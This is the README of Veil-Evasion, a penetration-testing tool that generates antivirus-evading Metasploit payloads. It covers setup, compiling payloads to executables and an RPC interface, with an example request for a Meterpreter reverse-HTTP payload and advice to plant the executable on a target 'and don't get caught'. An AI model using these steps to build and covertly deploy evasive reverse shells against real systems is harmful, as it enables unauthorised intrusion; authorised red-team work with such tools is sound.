# Veil-Evasion

Veil-Evasion is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.

NOTE: `./setup/setup.sh` should be re-run on every major version update. If you receive any major errors on running Veil-Evasion, first try re-running this script to install any additional packages and update the common configuration file.

Veil-Evasion is currently under active support by @ChrisTruncer, @TheMightyShiv, @HarmJ0y.

Thanks to:
* @jasonjfrank
* @mjmaley
* @davidpmcguire

## Software Requirements:

### Linux

1.  Use Kali (x86) and all dependencies are pre-installed

**or**

1.  Install Python 2.7
2.  Install PyCrypto >= 2.3

### Windows (for Py2Exe compilation)

1.  Python (tested with x86 - http://www.python.org/download/releases/2.7/)
2.  Py2Exe (http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/)
3.  PyCrypto (http://www.voidspace.org.uk/python/modules.shtml)
4.  PyWin32 (http://sourceforge.net/projects/pywin32/files/pywin32/Build%20218/pywin32-218.win32-py2.7.exe/download)

## Setup (tl;dr)

Run `./setup/setup.sh` on Kali x86 (for Pyinstaller).

Install Python 2.7, Py2Exe, PyCrypto, and PyWin32 on a Windows computer (for Py2Exe).

### Quick Install

```bash
sudo apt-get -y install git
git clone https://github.com/Veil-Framework/Veil-Evasion.git
cd veil-Evasion/
bash setup/setup.sh -s
```

## Description

Veil-Evasion was designed to run on Kali Linux, but should function on any system capable of executing python scripts.  Simply call Veil-Evasion from the command line, and follow the menu to generate a payload.  Upon creating the payload, Veil-Evasion will ask if you would like the payload file to be converted into an executable by Pyinstaller or Py2Exe.

If using Pyinstaller, Veil-Evasion will convert your payload into an executable within Kali.

If using Py2Exe, Veil-Evasion will create three files:

* payload.py - The payload file
* setup.py - Required file for Py2Exe
* runme.bat - Batch script for compiling the payload into a Windows executable

Move all three files onto your Windows machine with Python installed.  All three files should be placed in the root of the directory Python was installed to (likely C:\Python27).  Run the batch script to convert the Python script into an executable format.

Place the executable file on your target machine through any means necessary and don't get caught!

## RPC Server
On the listener side, run:

`./Veil-Evasion --rpc`

This will start a listener on port 4242.

On the client side, you will need to run a client program. This can be a custom script or can be as simple as Netcat. The RPC server implements JSON-RPC. This is a good reference for interpreting requests and responses for JSON-RPC: http://json-rpc.org/wiki/specification

The RPC request format is as follows:

```
    method="version"            -   return the current Veil-Evasion version number
    method="payloads"           -   return all the currently loaded payloads
    method="payload_options"
        params="payload_name"   -   return the options for the specified payload
    method="generate"
        params=["payload=X",   
                "outputbase=Y"
                "overwrite=Z",
                "msfvenom=...",
                "LHOST=blah]     -   generate the specified payload with the given options and returns the path of the generated executable
```

This is a simple example of working with Veil-Evasion using Netcat:


```
root@kali:~# nc 127.0.0.1 4242
{"method":"version","params":[],"id":0}
```

And the server response:


```
{"id":0,"result":"2.21.4","error":null}

```

An example of a client program can be found here: http://github.com/miligulmohar/python-symmetric-jsonrpc/blob/master/examples/client.py

Note: The port for Veil-Evasion is 4242. This must be changed in client.py in order to work with it.

In order to generate a payload, *ALL* parameters must be included:

* payload - which payload to generate
* outputbase - the name to save the payload as
* LHOST - the ip address for the listening host
* LPORT - the port for the listening host
* pwnstaller - True to package python programs into an executable. False if not. Ignored for other payloads

This is a good reference to understand whether or not in use pwnstaller: http://www.verisgroup.com/blog/2014/05/07/pwnstaller-and-the-veil-framework/

An example of generating a payload:

```
root@kali:~# nc 127.0.0.1 4242
{"method":"generate","params":["payload=c/meterpreter/rev_http","outputbase=payloadName","LHOST=192.168.1.11","LPORT=2121","pwnstaller=False"],"id":1"}
```

And the server response:

```
{"id":8,"result":"/usr/share/veil-output/compiled/payloadName.exe","error":null}
```

Note: If there is no id specified in the request, Veil-Evasion will shut down. That being said, you can make as many valid requests as you would like until Veil-Evasion shuts down.

To shut down the RPC server run:

`./Veil-Evasion --rpcshutdown`
